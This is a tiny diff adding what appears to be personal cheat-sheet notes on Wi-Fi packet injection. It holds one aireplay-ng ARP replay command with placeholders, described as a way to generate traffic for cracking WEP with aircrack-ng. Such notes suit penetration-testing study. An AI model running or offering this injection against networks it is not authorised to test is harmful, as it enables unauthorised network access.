@@ -1,0 +1,4 @@
+Packet Injection - Arp Method, Arp Request Reply
+
+
+aireplay-ng --arpreplay -b (BSSID/ROUTER) -h (OUR MAC ADDRESS) wlan0mon - Waits for ARP packet, captures, and sends back; this is used to generate more data/packets to allow you to crack WEP connections using aircrack-ng.
